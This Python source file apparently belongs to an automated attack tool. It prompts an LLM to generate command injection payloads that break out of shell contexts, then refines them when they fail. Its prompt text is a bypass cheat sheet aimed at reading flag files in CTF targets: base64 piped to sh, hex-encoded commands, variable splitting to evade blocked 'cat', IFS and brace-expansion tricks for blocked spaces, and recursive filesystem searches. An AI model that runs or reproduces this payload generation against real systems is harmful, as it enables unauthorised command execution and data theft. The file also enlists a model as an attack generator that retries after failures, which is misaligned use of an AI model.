"""
LLM-powered Command Injection payload generation with context-awareness
"""
from dataclasses import dataclass
from typing import List, Optional
from .context_analyzer import CommandReflection, CommandContext


@dataclass
class CMDPayload:
    """Generated command injection payload"""
    payload: str
    technique: str
    confidence: float
    reasoning: str
    expected_output: str
    os_target: str  # 'linux', 'windows', 'both'


class CMDLLMEngine:
    """Generates context-aware command injection payloads using LLM intelligence"""

    def __init__(self, llm_client, cost_tracker=None):
        self.llm_client = llm_client
        self.cost_tracker = cost_tracker

    async def generate_context_aware_payloads(
        self,
        reflection: CommandReflection,
        blocked_chars: List[str],
        blocked_commands: List[str],
        goal: str = "flag_extraction",
        num_payloads: int = 5
    ) -> List[CMDPayload]:
        """
        Generate context-aware command injection payloads

        Args:
            reflection: Where and how input is reflected
            blocked_chars: Characters that are filtered
            blocked_commands: Commands that are blocked
            goal: Goal of exploitation
            num_payloads: Number of payloads to generate

        Returns:
            List of CMDPayload objects
        """

        prompt = self._build_context_aware_prompt(
            reflection, blocked_chars, blocked_commands, goal, num_payloads
        )

        try:
            # Get model and call LLM properly
            from src.xss_agent.llm_client import get_default_model
            model = get_default_model()

            messages = [{"role": "user", "content": prompt}]

            llm_response = self.llm_client.chat_completion(
                model=model,
                messages=messages,
                max_tokens=3000,
                temperature=0.7
            )

            response = llm_response["choices"][0]["message"]["content"]

            if self.cost_tracker:
                self.cost_tracker.add_call("cmd_payload_generation", tokens=3000)

            return self._parse_llm_response(response)

        except Exception as e:
            print(f"    ❌ LLM generation failed: {e}")
            return []

    def _build_context_aware_prompt(
        self,
        reflection: CommandReflection,
        blocked_chars: List[str],
        blocked_commands: List[str],
        goal: str,
        num_payloads: int
    ) -> str:
        """Build a detailed prompt for context-aware payload generation"""

        prompt = f"""You are a penetration testing expert specializing in Command Injection attacks.

DETECTED CONTEXT:
- Injection Context: {reflection.context.value}
- Operating System: {reflection.os_type}
- Command Prefix: {reflection.command_prefix}
- Inside Quotes: {reflection.in_quotes} ({reflection.quote_type if reflection.in_quotes else 'N/A'})
- Breakout Needed: {reflection.breakout_needed}

Context Before Injection:
...{reflection.context_before}[INJECTION]

Context After Injection:
[INJECTION]{reflection.context_after}...

DETECTED FILTERS:
"""

        if blocked_chars:
            prompt += f"- Blocked Characters: {', '.join(blocked_chars)}\n"
        else:
            prompt += "- Blocked Characters: None detected\n"

        if blocked_commands:
            prompt += f"- Blocked Commands: {', '.join(blocked_commands)}\n"
        else:
            prompt += "- Blocked Commands: None detected\n"

        if goal == "flag_extraction":
            prompt += f"""
EXPLOITATION GOAL: Flag Extraction
Target: Find and read flag file (typically /flag, /flag.txt, ./flag, etc.)

TASK: Generate {num_payloads} command injection payloads that will:
1. Break out of the current context ({reflection.context.value})
2. Work on {reflection.os_type} operating system
3. Bypass the detected filters
4. Find and read the flag file
5. Be syntactically correct and executable

IMPORTANT STRATEGIES:
"""

        # Add OS-specific techniques
        if reflection.os_type in ['linux', 'unknown']:
            prompt += """
LINUX/UNIX INJECTION TECHNIQUES:
- Separators: ; && || | & (newline)
- Command substitution: $(cmd) or `cmd`
- Wildcards: * ? [] for bypassing filters
- Base64 encoding: echo 'Y2F0IC9mbGFn' | base64 -d | sh
- Hex encoding: $(printf "\\x63\\x61\\x74") for 'cat'
- Variable expansion: a=ca;b=t;$a$b /flag
- Escape sequences: c\\at or ca''t or ca""t
- Command chaining: cat</flag or cat<>/flag
- Brace expansion: {cat,/flag}
- IFS manipulation: IFS=,;cmd

COMMON FLAG LOCATIONS:
- /flag or /flag.txt (most common in CTFs)
- ./flag or ./flag.txt
- /home/*/flag.txt
- /var/www/flag.txt
- /app/flag.txt
- Use: find / -name flag* 2>/dev/null or grep -r FLAG /

BYPASS TECHNIQUES:
"""

        if blocked_commands:
            prompt += f"""
If 'cat' is blocked:
- Use: head, tail, less, more, tac, nl, od, xxd, strings
- Use: while read line; do echo $line; done < /flag
- Use: $(</flag) or $(<flag)

If 'ls' is blocked:
- Use: echo *, printf '%s\\n' *, dir, find

If spaces blocked:
- Use: $IFS or ${IFS} or ${{IFS}}
- Use: tab character (%09 or \\t)
- Use: <, < for redirection without space
"""

        if blocked_chars:
            if '/' in blocked_chars:
                prompt += "- If / blocked: Use $(pwd) or ${HOME} or relative paths\n"
            if ';' in blocked_chars:
                prompt += "- If ; blocked: Use && or || or | or %0a (newline) or &\n"
            if ' ' in blocked_chars:
                prompt += "- If space blocked: Use ${IFS}, $IFS$(), %09, or <\n"
            if '|' in blocked_chars:
                prompt += "- If | blocked: Use ; or && or command substitution\n"

        elif reflection.os_type == 'windows':
            prompt += """
WINDOWS INJECTION TECHNIQUES:
- Separators: & && || | (newline)
- Command substitution: ` (backtick)
- Variables: %VAR% or !VAR!
- Wildcards: * ?
- Escape: ^
- Alternative commands: Use type instead of cat, dir instead of ls
"""

        prompt += f"""

CONTEXT BREAKOUT:
Your payloads MUST start with the breakout sequence: {reflection.breakout_needed}
Then add the command separator appropriate for {reflection.os_type}.
Then inject your command.

Example structure:
{reflection.breakout_needed}<SEPARATOR><YOUR_COMMAND>

For each payload, provide:
1. The COMPLETE payload including all breakout sequences
2. The technique used (be specific about bypass method)
3. Confidence score (0.0-1.0)
4. Step-by-step reasoning explaining:
   - How it breaks out of the context
   - How it bypasses filters
   - What command it executes and why
5. Expected output pattern to detect success

FORMAT (exactly as shown):
PAYLOAD: <complete_payload_with_breakout>
TECHNIQUE: <specific_technique_and_bypass>
CONFIDENCE: <0.0-1.0>
OS: <linux|windows|both>
REASONING: <detailed_explanation>
EXPECTED: <what_output_indicates_success>
---

Generate {num_payloads} DIFFERENT payloads using VARIED bypass techniques.
"""

        return prompt

    def _parse_llm_response(self, response: str) -> List[CMDPayload]:
        """Parse LLM response into CMDPayload objects"""
        payloads = []

        # Split by separator
        blocks = response.split('---')

        for block in blocks:
            block = block.strip()
            if not block:
                continue

            # Extract fields
            payload = None
            technique = None
            confidence = 0.5
            os_target = "linux"
            reasoning = ""
            expected = ""

            for line in block.split('\n'):
                line = line.strip()
                if line.startswith('PAYLOAD:'):
                    payload = line[8:].strip()
                elif line.startswith('TECHNIQUE:'):
                    technique = line[10:].strip()
                elif line.startswith('CONFIDENCE:'):
                    try:
                        confidence = float(line[11:].strip())
                    except:
                        confidence = 0.5
                elif line.startswith('OS:'):
                    os_target = line[3:].strip().lower()
                elif line.startswith('REASONING:'):
                    reasoning = line[10:].strip()
                elif line.startswith('EXPECTED:'):
                    expected = line[9:].strip()

            if payload and technique:
                payloads.append(CMDPayload(
                    payload=payload,
                    technique=technique,
                    confidence=confidence,
                    reasoning=reasoning,
                    expected_output=expected,
                    os_target=os_target
                ))

        return payloads

    async def refine_failed_payload(
        self,
        failed_payload: CMDPayload,
        error_response: str,
        reflection: CommandReflection
    ) -> List[CMDPayload]:
        """Refine a failed payload based on error feedback"""

        prompt = f"""A command injection payload failed. Analyze and generate improved alternatives.

FAILED PAYLOAD:
{failed_payload.payload}

TECHNIQUE USED:
{failed_payload.technique}

ORIGINAL REASONING:
{failed_payload.reasoning}

ERROR/RESPONSE:
{error_response[:500]}

CONTEXT:
- Injection Context: {reflection.context.value}
- OS: {reflection.os_type}
- Breakout Needed: {reflection.breakout_needed}

TASK: Generate 3 REFINED payloads that:
1. Address why the previous payload failed
2. Use different bypass techniques
3. Are more likely to succeed

FORMAT:
PAYLOAD: <refined_payload>
TECHNIQUE: <new_technique>
CONFIDENCE: <0.0-1.0>
OS: <linux|windows|both>
REASONING: <why_this_should_work_better>
EXPECTED: <success_indicator>
---
"""

        try:
            # Get model and call LLM properly
            from src.xss_agent.llm_client import get_default_model
            model = get_default_model()

            messages = [{"role": "user", "content": prompt}]

            llm_response = self.llm_client.chat_completion(
                model=model,
                messages=messages,
                max_tokens=2000,
                temperature=0.8
            )

            response = llm_response["choices"][0]["message"]["content"]

            return self._parse_llm_response(response)

        except Exception as e:
            print(f"    ❌ Refinement failed: {e}")
            return []
